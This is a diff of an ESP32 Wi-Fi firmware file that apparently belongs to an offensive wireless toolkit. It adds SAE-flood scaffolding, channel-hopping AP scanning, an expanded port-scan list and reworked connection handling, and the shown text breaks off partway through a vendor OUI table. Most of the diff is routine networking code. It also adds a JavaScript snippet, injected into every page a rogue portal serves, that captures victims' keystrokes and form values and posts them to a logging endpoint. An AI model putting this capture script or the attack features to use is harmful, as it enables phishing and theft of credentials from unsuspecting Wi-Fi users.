@@ -1,6 +1,7 @@
 // wifi_manager.c
 
 #include "managers/wifi_manager.h"
+#include "core/callbacks.h"  // For callback function declarations
 #include "esp_crt_bundle.h"
 #include "esp_event.h"
 #include "esp_heap_caps.h" // Add include for heap stats
@@ -11,6 +12,8 @@
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
 #include "lwip/etharp.h"
+#include "lwip/netif.h"
+#include "lwip/ip4_addr.h"
 #include "lwip/lwip_napt.h"
 #include "managers/ap_manager.h"
 #include "managers/rgb_manager.h"
@@ -36,6 +39,13 @@
 #include <inttypes.h>
 #include "managers/default_portal.h"
 #include "freertos/task.h"
+#include "freertos/portmacro.h"
+#include "mbedtls/ecp.h"
+#include "mbedtls/ctr_drbg.h"
+#include "mbedtls/entropy.h"
+#include "mbedtls/sha256.h"
+#include "mbedtls/hmac_drbg.h"
+#include "mbedtls/bignum.h"
 
 // Defines for Station Scan Channel Hopping
 #define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
@@ -58,83 +68,202 @@ static int g_beacon_list_count = 0;
 
 static void wifi_beacon_list_task(void *param);
 
+// Forward declarations for SAE flood attack
+static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static esp_err_t start_live_ap_channel_hopping(void);
+static void stop_live_ap_channel_hopping(void);
+static esp_timer_handle_t live_ap_channel_hop_timer = NULL;
+static volatile bool live_ap_hopping_active = false;
+static uint32_t last_live_print_ms = 0;
+static uint16_t live_last_printed_index = 0;
+
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+static const uint8_t live_ap_channels[] = {
+    1,2,3,4,5,6,7,8,9,10,11,12,13,
+    36,40,44,48,52,56,60,64,
+    100,104,108,112,116,120,124,128,132,136,140,144,
+    149,153,157,161,165
+};
+#else
+static const uint8_t live_ap_channels[] = {
+    1,2,3,4,5,6,7,8,9,10,11,12,13
+};
+#endif
+static const size_t live_ap_channels_len = sizeof(live_ap_channels) / sizeof(live_ap_channels[0]);
+static size_t live_ap_channel_index = 0;
+
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
 
 station_ap_pair_t station_ap_list[MAX_STATIONS];
 int station_count = 0;
+bool manual_disconnect = false;
+static bool boot_connection_attempted = false;
 void *beacon_task_handle = NULL;
 void *deauth_task_handle = NULL;
 int beacon_task_running = 0;
 
 const uint16_t COMMON_PORTS[] = {
-    20,    // FTP Data
-    21,    // FTP Control
-    22,    // SSH
-    23,    // Telnet
-    25,    // SMTP
-    53,    // DNS
-    69,    // TFTP
-    80,    // HTTP
-    88,    // Kerberos
-    110,   // POP3
-    111,   // RPCBind
-    123,   // NTP
-    135,   // MSRPC
-    137,   // NetBIOS Name Service
-    138,   // NetBIOS Datagram Service
-    139,   // NetBIOS Session Service
-    143,   // IMAP
-    161,   // SNMP
-    389,   // LDAP
-    443,   // HTTPS
-    445,   // SMB
-    465,   // SMTPS
-    500,   // IKE (VPN)
-    514,   // Syslog
-    515,   // LPD/LPR Printer
-    587,   // SMTP (submission)
-    631,   // IPP (Printing)
-    636,   // LDAPS
-    993,   // IMAPS
-    995,   // POP3S
-    1080,  // SOCKS Proxy
-    1433,  // MSSQL
-    1434,  // MSSQL Browser
-    1521,  // Oracle DB
-    1701,  // L2TP
-    1723,  // PPTP
-    1883,  // MQTT
-    2049,  // NFS
-    2082,  // cPanel
-    2083,  // cPanel SSL
-    2086,  // WHM
-    2087,  // WHM SSL
-    2222,  // Alternative SSH
-    3306,  // MySQL
-    3389,  // RDP
-    5060,  // SIP
-    5222,  // XMPP
-    5432,  // PostgreSQL
-    5900,  // VNC
-    5901,  // VNC-1
-    5902,  // VNC-2
-    6379,  // Redis
-    8080,  // HTTP Proxy
-    8443,  // HTTPS Alt
-    8883,  // MQTT SSL
-    9100,  // Printer
-    27017, // MongoDB
-    32400, // Plex Media Server
-    51820, // Wireguard
-    55443  // Alt HTTP
+    7,     // echo
+    20,    // ftp-data
+    21,    // ftp
+    22,    // ssh
+    23,    // telnet
+    25,    // smtp
+    53,    // dns
+    69,    // tftp (udp mostly)
+    80,    // http
+    88,    // kerberos
+    110,   // pop3
+    111,   // rpcbind
+    119,   // nntp
+    123,   // ntp (udp mostly)
+    135,   // msrpc
+    137,   // netbios-ns
+    138,   // netbios-dgm
+    139,   // netbios-ssn
+    143,   // imap
+    161,   // snmp (udp mostly)
+    162,   // snmp-trap (udp mostly)
+    389,   // ldap
+    443,   // https
+    445,   // smb
+    465,   // smtps
+    500,   // ike (udp mostly)
+    502,   // modbus
+    512,   // exec
+    513,   // login
+    514,   // syslog/shell (udp mostly)
+    515,   // lpd
+    587,   // smtp-submission
+    593,   // rpc over http
+    631,   // ipp
+    636,   // ldaps
+    646,   // ldp
+    873,   // rsync
+    902,   // vmware-server
+    989,   // ftps-data
+    990,   // ftps
+    993,   // imaps
+    995,   // pop3s
+    1080,  // socks
+    1099,  // rmi
+    1433,  // mssql
+    1434,  // mssql-browser (udp mostly)
+    1494,  // citrix-ica
+    1521,  // oracle-db
+    1701,  // l2tp (udp mostly)
+    1720,  // h323
+    1723,  // pptp
+    1883,  // mqtt
+    1900,  // ssdp (udp mostly)
+    2049,  // nfs
+    2082,  // cpanel
+    2083,  // cpanel-ssl
+    2086,  // whm
+    2087,  // whm-ssl
+    2095,  // webmail
+    2096,  // webmail-ssl
+    2222,  // ssh-alt
+    2375,  // docker
+    2376,  // docker-tls
+    2377,  // docker-swarm
+    2379,  // etcd
+    2380,  // etcd-peer
+    2381,  // etcd-alt
+    2480,  // oracle-web
+    25565, // minecraft
+    27017, // mongodb
+    27018, // mongodb-shard
+    27019, // mongodb-config
+    28017, // mongodb-http
+    3000,  // dev-http
+    3001,  // dev-http-alt
+    3128,  // squid-proxy
+    32400, // plex
+    3260,  // iscsi
+    3306,  // mysql
+    3389,  // rdp
+    3478,  // stun (udp mostly)
+    3689,  // daap
+    4369,  // epmd
+    4444,  // tcp-alt
+    4500,  // ipsec-nat-t (udp mostly)
+    4789,  // vxlan (udp mostly)
+    4848,  // glassfish-admin
+    5000,  // http-alt/upnp
+    5001,  // http-alt
+    5004,  // rtp (udp mostly)
+    5005,  // rtp (udp mostly)
+    5060,  // sip
+    5061,  // sips
+    5222,  // xmpp
+    5223,  // xmpp-ssl/apns
+    5357,  // wsdapi
+    5432,  // postgresql
+    5555,  // android-adb
+    5601,  // kibana
+    5671,  // amqp-tls
+    5672,  // amqp
+    5683,  // coap (udp mostly)
+    5900,  // vnc
+    5901,  // vnc-1
+    5902,  // vnc-2
+    5984,  // couchdb
+    5985,  // winrm
+    5986,  // winrm-https
+    6000,  // x11
+    6379,  // redis
+    6667,  // irc
+    7001,  // websphere
+    7199,  // cassandra-intra
+    8000,  // http-alt
+    8008,  // http-alt
+    8080,  // http-proxy
+    8081,  // http-alt
+    8082,  // http-alt
+    8083,  // http-alt
+    8086,  // influxdb
+    8088,  // http-alt
+    8123,  // home-assistant
+    8161,  // activemq
+    8181,  // http-alt
+    8200,  // upnp-minidlna
+    8222,  // vmware
+    8333,  // bitcoin
+    8443,  // https-alt
+    8500,  // consul
+    8530,  // wsus
+    8554,  // rtsp-alt
+    8883,  // mqtt-tls
+    8888,  // http-alt
+    9000,  // sonarqube/php-fpm
+    9042,  // cassandra-cql
+    9080,  // http-alt
+    9090,  // http-alt
+    9091,  // transmission
+    9092,  // kafka
+    9100,  // printer
+    9200,  // elasticsearch
+    9300,  // elasticsearch-node
+    9418,  // git
+    9443,  // https-alt
+    10000, // webmin
+    11211, // memcached
+    15672, // rabbitmq-mgmt
+    51820, // wireguard
+    55443  // http-alt
 };
 const size_t NUM_PORTS = sizeof(COMMON_PORTS) / sizeof(COMMON_PORTS[0]);
+static const uint16_t UDP_COMMON_PORTS[] = {
+    53, 67, 68, 69, 123, 137, 161, 162, 1900, 500, 514, 520, 5353, 5683
+};
+static const size_t NUM_UDP_PORTS = sizeof(UDP_COMMON_PORTS) / sizeof(UDP_COMMON_PORTS[0]);
 static char PORTALURL[512] = "";
 static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
-const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
 wifi_ap_record_t *selected_aps = NULL;
 int selected_ap_count = 0;
@@ -152,6 +281,15 @@ static bool login_done = false;
 static char current_creds_filename[128] = "";
 static char current_keystrokes_filename[128] = "";
 static int ap_connection_count = 0;
+
+#define MAX_HTML_BUFFER_SIZE 2048
+
+// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
+static const char *CAPTURE_JS_SNIPPET = \
+    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
+static char* html_buffer = NULL;
+static size_t html_buffer_size = 0;
+static bool use_html_buffer = false;
 
 // Station Scan Channel Hopping Globals
 static esp_timer_handle_t scansta_channel_hop_timer = NULL;
@@ -210,6 +348,10 @@ typedef enum {
     COMPANY_UNKNOWN
 } ECompany;
 
+void wifi_manager_set_manual_disconnect(bool disconnect) {
+    manual_disconnect = disconnect;
+}
+
 static void tolower_str(const uint8_t *src, char *dst) {
     for (int i = 0; i < 33 && src[i] != '\0'; i++) {
         dst[i] = tolower((char)src[i]);
@@ -264,11 +406,16 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
-            esp_wifi_connect();
+            // No auto-connect here - handled by wifi_event_handler
             break;
         case WIFI_EVENT_STA_DISCONNECTED:
-            printf("Disconnected from Wi-Fi\nRetrying...\n");
-            esp_wifi_connect();
+            if (manual_disconnect) {
+                printf("Disconnected from Wi-Fi (manual)\n");
+                manual_disconnect = false; // Reset flag
+            } else {
+                printf("Disconnected from Wi-Fi\n");
+                // No auto-reconnection
+            }
             break;
         default:
             break;
@@ -286,75 +433,68 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
     }
 }
 
-// OUI lists for each company
-const char *dlink_ouis[] = {
-    "00055D", "000D88", "000F3D", "001195", "001346", "0015E9", "00179A", "00195B", "001B11",
-    "001CF0", "001E58", "002191", "0022B0", "002401", "00265A", "00AD24", "04BAD6", "085A11",
-    "0C0E76", "0CB6D2", "1062EB", "10BEF5", "14D64D", "180F76", "1C5F2B", "1C7EE5", "1CAFF7",
-    "1CBDB9", "283B82", "302303", "340804", "340A33", "3C1E04", "3C3332", "4086CB", "409BCD",
-    "54B80A", "5CD998", "60634C", "642943", "6C198F", "6C7220", "744401", "74DADA", "78321B",
-    "78542E", "7898E8", "802689", "84C9B2", "8876B9", "908D78", "9094E4", "9CD643", "A06391",
-    "A0AB1B", "A42A95", "A8637D", "ACF1DF", "B437D8", "B8A386", "BC0F9A", "BC2228", "BCF685",
-    "C0A0BB", "C4A81D", "C4E90A", "C8787D", "C8BE19", "C8D3A3", "CCB255", "D8FEE3", "DCEAE7",
-    "E01CFC", "E46F13", "E8CC18", "EC2280", "ECADE0", "F07D68", "F0B4D2", "F48CEB", "F8E903",
-    "FC7516"};
-const char *netgear_ouis[] = {
-    "00095B", "000FB5", "00146C", "001B2F", "001E2A", "001F33", "00223F", "00224B2", "0026F2",
-    "008EF2", "08028E", "0836C9", "08BD43", "100C6B", "100D7F", "10DA43", "1459C0",  "204E7F",
-    "20E52A", "288088", "289401", "28C68E", "2C3033", "2CB05D", "30469A", "3498B5",  "3894ED",
-    "3C3786", "405D82", "44A56E", "4C60DE", "504A6E", "506A03", "54077D", "58EF68",  "6038E0",
-    "6CB0CE", "6CCDD6", "744401", "803773", "841B5E", "8C3BAD", "941865", "9C3DCF",  "9CC9EB",
-    "9CD36D", "A00460", "A021B7", "A040A0", "A42B8C", "B03956", "B07FB9", "B0B98A",  "BCA511",
-    "C03F0E", "C0FFD4", "C40415", "C43DC7", "C89E43", "CC40D0", "DCEF09", "E0469A",  "E046EE",
-    "E091F5", "E4F4C6", "E8FCAF", "F87394"};
-const char *belkin_ouis[] = {"001150", "00173F", "0030BD", "08BD43", "149182", "24F5A2",
-                             "302303", "80691A", "94103E", "944452", "B4750E", "C05627",
-                             "C4411E", "D8EC5E", "E89F80", "EC1A59", "EC2280"};
-const char *tplink_ouis[] = {"003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA",
-                             "30DE4B", "3460F9", "3C52A1", "40ED00", "482254", "5091E3", "54AF97",
-                             "5C628B", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5",
-                             "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024",
-                             "C006C3", "CC68B6", "E848B8", "F0A731"};
-const char *linksys_ouis[] = {
-    "00045A", "000625", "000C41", "000E08", "000F66", "001217", "001310", "0014BF", "0016B6",
-    "001839", "0018F8", "001A70", "001C10", "001D7E", "001EE5", "002129", "00226B", "002369",
-    "00259C", "002354", "0024B2", "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626",
-    "2887BA", "305A3A", "2CFDA1", "302303", "30469A", "40ED00", "482254", "5091E3", "54AF97",
-    "5CA2F4", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5", "7CC2C6", "9C5322",
-    "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024", "C006C3", "CC68B6", "E848B8", "F0A731"};
-const char *asus_ouis[] = {
-    "000C6E", "000EA6", "00112F", "0011D8", "0013D4", "0015F2", "001731", "0018F3", "001A92",
-    "001BFC", "001D60", "001E8C", "001FC6", "002215", "002354", "00248C", "002618", "00E018",
-    "04421A", "049226", "04D4C4", "04D9F5", "08606E", "086266", "08BFB8", "0C9D92", "107B44",
-    "107C61", "10BF48", "10C37B", "14DAE9", "14DDA9", "1831BF", "1C872C", "1CB72C", "20CF30",
-    "244BFE", "2C4D54", "2C56DC", "2CFDA1", "305A3A", "3085A9", "3497F6", "382C4A", "38D547",
-    "3C7C3F", "40167E", "40B076", "485B39", "4CEDFB", "50465D", "50EBF6", "5404A6", "54A050",
-    "581122", "6045CB", "60A44C", "60CF84", "704D7B", "708BCD", "74D02B", "7824AF", "7C10C9",
-    "88D7F6", "90E6BA", "9C5C8E", "A036BC", "A85E45", "AC220B", "AC9E17", "B06EBF", "BCAEC5",
-    "BCEE7B", "C86000", "C87F54", "CC28AA", "D017C2", "D45D64", "D850E6", "E03F49", "E0CB4E",
-    "E89C25", "F02F74", "F07959", "F46D04", "F832E4", "FC3497", "FCC233"};
-const char *actiontec_ouis[] = {"000FB3", "001505", "001801", "001EA7", "001F90", "0020E0",
-                                "00247B", "002662", "0026B8", "007F28", "0C6127", "105F06",
-                                "10785B", "109FA9", "181BEB", "207600", "408B07", "4C8B30",
-                                "5C35FC", "7058A4", "70F196", "70F220", "84E892", "941C56",
-                                "9C1E95", "A0A3E2", "A83944", "E86FF2", "F8E4FB", "FC2BB2"};
 
 static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
-                               void *event_data) {
+                               void *event_data);
+static void wifi_retry_timer_callback(void* arg);
+
+static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
+                               void *event_data)
+{
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
-        printf("WiFi started.\nReady to scan.\n");
-        TERMINAL_VIEW_ADD_TEXT("WiFi started.\nReady to scan.\n");
+        // Only auto-connect on boot if we have saved credentials
+        if (!boot_connection_attempted) {
+            boot_connection_attempted = true;
+            
+            const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
+            if (saved_ssid && strlen(saved_ssid) > 0) {
+                printf("Attempting boot-time connection to saved network: %s\n", saved_ssid);
+                TERMINAL_VIEW_ADD_TEXT("Connecting to saved network: %s\n", saved_ssid);
+                esp_wifi_connect();
+            }
+        }
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
-        printf("WiFi disconnected\n");
-        TERMINAL_VIEW_ADD_TEXT("WiFi disconnected\n");
+        wifi_event_sta_disconnected_t* disconnected = (wifi_event_sta_disconnected_t*) event_data;
+        
+        // Provide more detailed reason descriptions
+        const char* reason_str = "Unknown";
+        switch(disconnected->reason) {
+            case 2: reason_str = "Auth Expired"; break;
+            case 3: reason_str = "Auth Leave"; break;
+            case 4: reason_str = "Assoc Expire"; break;
+            case 5: reason_str = "Assoc Too Many"; break;
+            case 6: reason_str = "Not Authed"; break;
+            case 7: reason_str = "Not Assoc"; break;
+            case 8: reason_str = "Assoc Leave"; break;
+            case 15: reason_str = "4Way Handshake Timeout"; break;
+            case 201: reason_str = "Beacon Timeout"; break;
+            case 202: reason_str = "No AP Found"; break;
+            case 203: reason_str = "Auth Fail"; break;
+            case 204: reason_str = "Assoc Fail"; break;
+            case 205: reason_str = "Handshake Timeout"; break;
+        }
+        
+        // Clean, single-line disconnect logging
+        if (manual_disconnect) {
+            printf("WiFi disconnected manually\n");
+            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected manually\n");
+            manual_disconnect = false; // Reset the flag
+        } else {
+            printf("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
+            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
+        }
+        
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
     } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
-        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
-        printf("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
-        TERMINAL_VIEW_ADD_TEXT("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
+        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
+        printf("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
+        TERMINAL_VIEW_ADD_TEXT("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
+        
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
 }
+
+// Removed old wifi_retry_timer_callback - using unified retry system
 
 static void generate_random_ssid(char *ssid, size_t length) {
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -396,61 +536,72 @@ static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bs
     }
 }
 
+typedef struct {
+    const char* oui;
+    ECompany company;
+} oui_company_map_t;
+
+static const oui_company_map_t OUI_MAP[] = {
+    {"00055D", COMPANY_DLINK}, {"000D88", COMPANY_DLINK}, {"000F3D", COMPANY_DLINK}, {"001195", COMPANY_DLINK}, {"001346", COMPANY_DLINK}, {"0015E9", COMPANY_DLINK}, {"00179A", COMPANY_DLINK}, {"00195B", COMPANY_DLINK}, {"001B11", COMPANY_DLINK},
+    {"001CF0", COMPANY_DLINK}, {"001E58", COMPANY_DLINK}, {"002191", COMPANY_DLINK}, {"0022B0", COMPANY_DLINK}, {"002401", COMPANY_DLINK}, {"00265A", COMPANY_DLINK}, {"00AD24", COMPANY_DLINK}, {"04BAD6", COMPANY_DLINK}, {"085A11", COMPANY_DLINK},
+    {"0C0E76", COMPANY_DLINK}, {"0CB6D2", COMPANY_DLINK}, {"1062EB", COMPANY_DLINK}, {"10BEF5", COMPANY_DLINK}, {"14D64D", COMPANY_DLINK}, {"180F76", COMPANY_DLINK}, {"1C5F2B", COMPANY_DLINK}, {"1C7EE5", COMPANY_DLINK}, {"1CAFF7", COMPANY_DLINK},
+    {"1CBDB9", COMPANY_DLINK}, {"283B82", COMPANY_DLINK}, {"302303", COMPANY_DLINK}, {"340804", COMPANY_DLINK}, {"340A33", COMPANY_DLINK}, {"3C1E04", COMPANY_DLINK}, {"3C3332", COMPANY_DLINK}, {"4086CB", COMPANY_DLINK}, {"409BCD", COMPANY_DLINK},
+    {"54B80A", COMPANY_DLINK}, {"5CD998", COMPANY_DLINK}, {"60634C", COMPANY_DLINK}, {"642943", COMPANY_DLINK}, {"6C198F", COMPANY_DLINK}, {"6C7220", COMPANY_DLINK}, {"744401", COMPANY_DLINK}, {"74DADA", COMPANY_DLINK}, {"78321B", COMPANY_DLINK},
+    {"78542E", COMPANY_DLINK}, {"7898E8", COMPANY_DLINK}, {"802689", COMPANY_DLINK}, {"84C9B2", COMPANY_DLINK}, {"8876B9", COMPANY_DLINK}, {"908D78", COMPANY_DLINK}, {"9094E4", COMPANY_DLINK}, {"9CD643", COMPANY_DLINK}, {"A06391", COMPANY_DLINK},
+    {"A0AB1B", COMPANY_DLINK}, {"A42A95", COMPANY_DLINK}, {"A8637D", COMPANY_DLINK}, {"ACF1DF", COMPANY_DLINK}, {"B437D8", COMPANY_DLINK}, {"B8A386", COMPANY_DLINK}, {"BC0F9A", COMPANY_DLINK}, {"BC2228", COMPANY_DLINK}, {"BCF685", COMPANY_DLINK},
+    {"C0A0BB", COMPANY_DLINK}, {"C4A81D", COMPANY_DLINK}, {"C4E90A", COMPANY_DLINK}, {"C8787D", COMPANY_DLINK}, {"C8BE19", COMPANY_DLINK}, {"C8D3A3", COMPANY_DLINK}, {"CCB255", COMPANY_DLINK}, {"D8FEE3", COMPANY_DLINK}, {"DCEAE7", COMPANY_DLINK},
+    {"E01CFC", COMPANY_DLINK}, {"E46F13", COMPANY_DLINK}, {"E8CC18", COMPANY_DLINK}, {"EC2280", COMPANY_DLINK}, {"ECADE0", COMPANY_DLINK}, {"F07D68", COMPANY_DLINK}, {"F0B4D2", COMPANY_DLINK}, {"F48CEB", COMPANY_DLINK}, {"F8E903", COMPANY_DLINK},
+    {"FC7516", COMPANY_DLINK},
+    {"00095B", COMPANY_NETGEAR}, {"000FB5", COMPANY_NETGEAR}, {"00146C", COMPANY_NETGEAR}, {"001B2F", COMPANY_NETGEAR}, {"001E2A", COMPANY_NETGEAR}, {"001F33", COMPANY_NETGEAR}, {"00223F", COMPANY_NETGEAR}, {"00224B", COMPANY_NETGEAR}, {"0026F2", COMPANY_NETGEAR},
+    {"008EF2", COMPANY_NETGEAR}, {"08028E", COMPANY_NETGEAR}, {"0836C9", COMPANY_NETGEAR}, {"08BD43", COMPANY_NETGEAR}, {"100C6B", COMPANY_NETGEAR}, {"100D7F", COMPANY_NETGEAR}, {"10DA43", COMPANY_NETGEAR}, {"1459C0", COMPANY_NETGEAR},  {"204E7F", COMPANY_NETGEAR},
+    {"20E52A", COMPANY_NETGEAR}, {"288088", COMPANY_NETGEAR}, {"289401", COMPANY_NETGEAR}, {"28C68E", COMPANY_NETGEAR}, {"2C3033", COMPANY_NETGEAR}, {"2CB05D", COMPANY_NETGEAR}, {"30469A", COMPANY_NETGEAR}, {"3498B5", COMPANY_NETGEAR},  {"3894ED", COMPANY_NETGEAR},
+    {"3C3786", COMPANY_NETGEAR}, {"405D82", COMPANY_NETGEAR}, {"44A56E", COMPANY_NETGEAR}, {"4C60DE", COMPANY_NETGEAR}, {"504A6E", COMPANY_NETGEAR}, {"506A03", COMPANY_NETGEAR}, {"54077D", COMPANY_NETGEAR}, {"58EF68", COMPANY_NETGEAR},  {"6038E0", COMPANY_NETGEAR},
+    {"6CB0CE", COMPANY_NETGEAR}, {"6CCDD6", COMPANY_NETGEAR}, {"744401", COMPANY_NETGEAR}, {"803773", COMPANY_NETGEAR}, {"841B5E", COMPANY_NETGEAR}, {"8C3BAD", COMPANY_NETGEAR}, {"941865", COMPANY_NETGEAR}, {"9C3DCF", COMPANY_NETGEAR},  {"9CC9EB", COMPANY_NETGEAR},
+    {"9CD36D", COMPANY_NETGEAR}, {"A00460", COMPANY_NETGEAR}, {"A021B7", COMPANY_NETGEAR}, {"A040A0", COMPANY_NETGEAR}, {"A42B8C", COMPANY_NETGEAR}, {"B03956", COMPANY_NETGEAR}, {"B07FB9", COMPANY_NETGEAR}, {"B0B98A", COMPANY_NETGEAR},  {"BCA511", COMPANY_NETGEAR},
+    {"C03F0E", COMPANY_NETGEAR}, {"C0FFD4", COMPANY_NETGEAR}, {"C40415", COMPANY_NETGEAR}, {"C43DC7", COMPANY_NETGEAR}, {"C89E43", COMPANY_NETGEAR}, {"CC40D0", COMPANY_NETGEAR}, {"DCEF09", COMPANY_NETGEAR}, {"E0469A", COMPANY_NETGEAR},  {"E046EE", COMPANY_NETGEAR},
+    {"E091F5", COMPANY_NETGEAR}, {"E4F4C6", COMPANY_NETGEAR}, {"E8FCAF", COMPANY_NETGEAR}, {"F87394", COMPANY_NETGEAR},
+    {"001150", COMPANY_BELKIN}, {"00173F", COMPANY_BELKIN}, {"0030BD", COMPANY_BELKIN}, {"08BD43", COMPANY_BELKIN}, {"149182", COMPANY_BELKIN}, {"24F5A2", COMPANY_BELKIN},
+    {"302303", COMPANY_BELKIN}, {"80691A", COMPANY_BELKIN}, {"94103E", COMPANY_BELKIN}, {"944452", COMPANY_BELKIN}, {"B4750E", COMPANY_BELKIN}, {"C05627", COMPANY_BELKIN},
+    {"C4411E", COMPANY_BELKIN}, {"D8EC5E", COMPANY_BELKIN}, {"E89F80", COMPANY_BELKIN}, {"EC1A59", COMPANY_BELKIN}, {"EC2280", COMPANY_BELKIN},
+    {"003192", COMPANY_TPLINK}, {"005F67", COMPANY_TPLINK}, {"1027F5", COMPANY_TPLINK}, {"14EBB6", COMPANY_TPLINK}, {"1C61B4", COMPANY_TPLINK}, {"203626", COMPANY_TPLINK}, {"2887BA", COMPANY_TPLINK},
+    {"30DE4B", COMPANY_TPLINK}, {"3460F9", COMPANY_TPLINK}, {"3C52A1", COMPANY_TPLINK}, {"40ED00", COMPANY_TPLINK}, {"482254", COMPANY_TPLINK}, {"5091E3", COMPANY_TPLINK}, {"54AF97", COMPANY_TPLINK},
+    {"5C628B", COMPANY_TPLINK}, {"5CA6E6", COMPANY_TPLINK}, {"5CE931", COMPANY_TPLINK}, {"60A4B7", COMPANY_TPLINK}, {"687FF0", COMPANY_TPLINK}, {"6C5AB0", COMPANY_TPLINK}, {"788CB5", COMPANY_TPLINK},
+    {"7CC2C6", COMPANY_TPLINK}, {"9C5322", COMPANY_TPLINK}, {"9CA2F4", COMPANY_TPLINK}, {"A842A1", COMPANY_TPLINK}, {"AC15A2", COMPANY_TPLINK}, {"B0A7B9", COMPANY_TPLINK}, {"B4B024", COMPANY_TPLINK},
+    {"C006C3", COMPANY_TPLINK}, {"CC68B6", COMPANY_TPLINK}, {"E848B8", COMPANY_TPLINK}, {"F0A731", COMPANY_TPLINK},
+    {"00045A", COMPANY_LINKSYS}, {"000625", COMPANY_LINKSYS}, {"000C41", COMPANY_LINKSYS}, {"000E08", COMPANY_LINKSYS}, {"000F66", COMPANY_LINKSYS}, {"001217", COMPANY_LINKSYS}, {"001310", COMPANY_LINKSYS}, {"0014BF", COMPANY_LINKSYS}, {"0016B6", COMPANY_LINKSYS},
+    {"001839", COMPANY_LINKSYS}, {"0018F8", COMPANY_LINKSYS}, {"001A70", COMPANY_LINKSYS}, {"001C10", COMPANY_LINKSYS}, {"001D7E", COMPANY_LINKSYS}, {"001EE5", COMPANY_LINKSYS}, {"002129", COMPANY_LINKSYS}, {"00226B", COMPANY_LINKSYS}, {"002369", COMPANY_LINKSYS},
+    {"00259C", COMPANY_LINKSYS}, {"002354", COMPANY_LINKSYS}, {"0024B2", COMPANY_LINKSYS}, {"003192", COMPANY_LINKSYS}, {"005F67", COMPANY_LINKSYS}, {"1027F5", COMPANY_LINKSYS}, {"14EBB6", COMPANY_LINKSYS}, {"1C61B4", COMPANY_LINKSYS}, {"203626", COMPANY_LINKSYS},
+    {"2887BA", COMPANY_LINKSYS}, {"305A3A", COMPANY_LINKSYS}, {"2CFDA1", COMPANY_LINKSYS}, {"302303", COMPANY_LINKSYS}, {"30469A", COMPANY_LINKSYS}, {"40ED00", COMPANY_LINKSYS}, {"482254", COMPANY_LINKSYS}, {"5091E3", COMPANY_LINKSYS}, {"54AF97", COMPANY_LINKSYS},
+    {"5CA2F4", COMPANY_LINKSYS}, {"5CA6E6", COMPANY_LINKSYS}, {"5CE931", COMPANY_LINKSYS}, {"60A4B7", COMPANY_LINKSYS}, {"687FF0", COMPANY_LINKSYS}, {"6C5AB0", COMPANY_LINKSYS}, {"788CB5", COMPANY_LINKSYS}, {"7CC2C6", COMPANY_LINKSYS}, {"9C5322", COMPANY_LINKSYS},
+    {"9CA2F4", COMPANY_LINKSYS}, {"A842A1", COMPANY_LINKSYS}, {"AC15A2", COMPANY_LINKSYS}, {"B0A7B9", COMPANY_LINKSYS}, {"B4B024", COMPANY_LINKSYS}, {"C006C3", COMPANY_LINKSYS}, {"CC68B6", COMPANY_LINKSYS}, {"E848B8", COMPANY_LINKSYS}, {"F0A731", COMPANY_LINKSYS},
+    {"000C6E", COMPANY_ASUS}, {"000EA6", COMPANY_ASUS}, {"00112F", COMPANY_ASUS}, {"0011D8", COMPANY_ASUS}, {"0013D4", COMPANY_ASUS}, {"0015F2", COMPANY_ASUS}, {"001731", COMPANY_ASUS}, {"0018F3", COMPANY_ASUS}, {"001A92", COMPANY_ASUS},
